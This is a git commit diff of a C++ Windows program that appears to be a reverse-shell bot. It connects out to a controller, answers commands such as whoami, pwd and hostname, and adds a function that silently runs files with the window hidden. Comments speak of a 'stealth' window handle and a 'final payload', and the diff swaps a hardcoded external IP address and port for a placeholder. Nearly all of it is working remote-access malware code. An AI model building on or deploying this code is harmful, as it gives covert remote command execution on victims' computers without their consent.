c48d33ba97da3cea6e263824d3ba1244fed9e9b6
mik <mime9599@colorado.edu>
2020-08-19 03:17:08 -0600

    bot server in

--- socketApp1.cpp
+++ socketApp1.cpp
@@ -3,10 +3,10 @@
 
 #include <winsock2.h>   //Sock Head. Includes socket functions from socket lib.
 #include <windows.h>    //Win API Head. Include Win API functions.
-#include <ws2tcpip.h>   //TCP-IP Head. Definitions for TCP/IP protocols.
+//#include <ws2tcpip.h>   //TCP-IP Head. Definitions for TCP/IP protocols.
 //C Headers
 
-#include <stdio.h>      //Input/Output. Main input/output operations. Least required bytes in program.
+#include <cstdio>      //Input/Output. Main input/output operations. Least required bytes in program.
 
 //Debug Headers
 //COMMENT OUT OF FINAL PAYLOAD.
@@ -18,15 +18,27 @@
 #define DEFAULT_BUFLEN 1024 //Size of bytes sent and received over network.
 
 void whoami(char* returnValue, int returnSize) {
-
+    DWORD bufflen = 257;
+    GetUserName(returnValue, &bufflen);
 }
 
 void pwd(char* returnValue, int returnSize) {
+    TCHAR tempDir[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, tempDir);
+    strcat(returnValue, tempDir);
+}
+
+void getHostname(char* returnValue, int returnSize) {
 
 }
 
-void execute(char* returnValue, int returnSize) {
-
+void execute(char* returnValue, int returnSize, char *file) {
+    if ((int)(ShellExecute(nullptr, "open", file, nullptr, nullptr, SW_HIDE)) <= 32) {     //Function failed if the return value is a number less than or equal to 32.
+        strcat(returnValue, "Error executing...\n");
+    }
+    else {
+        strcat(returnValue, "\n");
+    }
 }
 
 /*
@@ -46,10 +58,10 @@ void RevShell() {
      * IPProt_TCP : TCP/IP protocol
      */
 
-    sockaddr_in address;    //Windows data struct that collects values of addressing schema to be used. IP address and port to connect to.
+    sockaddr_in address = {};    //Windows data struct that collects values of addressing schema to be used. IP address and port to connect to.
     address.sin_family = AF_INET;   //Assign the variable the address family.
-    address.sin_addr.s_addr = inet_addr("198.46.82.83");   //IP Address to connect to. inet_addr() function converts the string from standard IPv4 dotted decimal notation, to an int value for used as an internet address.
-    address.sin_port = htons(21);     //The port to connect to. Converts unsigned short int hostshort from host-byte order to network-bye order.
+    address.sin_addr.s_addr = inet_addr("0.0.0.0");   //IP Address to connect to. inet_addr() function converts the string from standard IPv4 dotted decimal notation, to an int value for used as an internet address.
+    address.sin_port = htons(8080);     //The port to connect to. Converts unsigned short int hostshort from host-byte order to network-bye order.
 
     /*
      * "Connect" attempts to make connection to socket.
@@ -74,26 +86,38 @@ void RevShell() {
              * In blocking(synchronous) mode, the functions of the socket do not return until their actions are finished.
              *
             */
+
+            // Debugging
             int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
 
-            /*std::cout << "Recieved: " << CommandGiven << std::endl;
-            std::cout << "Length of command: " << results << std::endl;*/
+            std::cout << "Recieved: " << CommandGiven << std::endl;
+            std::cout << "Length of command: " << results << std::endl;
 
-            if ((strcmp(CommandGiven, "whoami\n") == 0)) {
+            if ((strcmp(CommandGiven, "whoami") == 0)) {
                 char temp[257] = "";
                 whoami(temp, 257);
+                strcat(temp, "\n");
+                send(tcpsock, temp, strlen(temp)+1, 0);
                 memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
             }
-            else if ((strcmp(CommandGiven, "pwd\n") == 0)) {
+            else if ((strcmp(CommandGiven, "pwd") == 0)) {
                 char temp[257] = "";
                 pwd(temp, 257);
+                strcat(temp, "\n");
+                send(tcpsock, temp, strlen(temp)+1, 0);
                 memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
             }
-            else if ((strcmp(CommandGiven, "ls\n") == 0)) {
+            else if ((strcmp(CommandGiven, "hostname") == 0)) {
+                char temp[257] = "";
+                getHostname(temp, 257);
+                strcat(temp, "\n");
+                send(tcpsock, temp, strlen(temp)+1, 0);
+            }
+            /*else if ((strcmp(CommandGiven, "ls\n") == 0)) {
                 std::cout << "Parsed: ls" << std::endl;
                 memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
-            }
-            else if ((strcmp(CommandGiven, "exit\n") == 0)) {
+            }*/
+            else if ((strcmp(CommandGiven, "exit") == 0)) {
                 closesocket(tcpsock);
                 WSACleanup();
                 exit(0);
@@ -115,7 +139,7 @@ int main() {
      * So, to manage/modify other applications an object returns a handle which can be used by other applications.
      */
     AllocConsole(); //Assign a new console to the process.
-    stealth = FindWindowA("ConsoleWindowClass", NULL);  //Find and attach stealth to the new window.
+    stealth = FindWindowA("ConsoleWindowClass", nullptr);  //Find and attach stealth to the new window.
     ShowWindow(stealth, SW_SHOWNORMAL);
     /*
      * SW_SHOWNORMAL = 1 = Shown
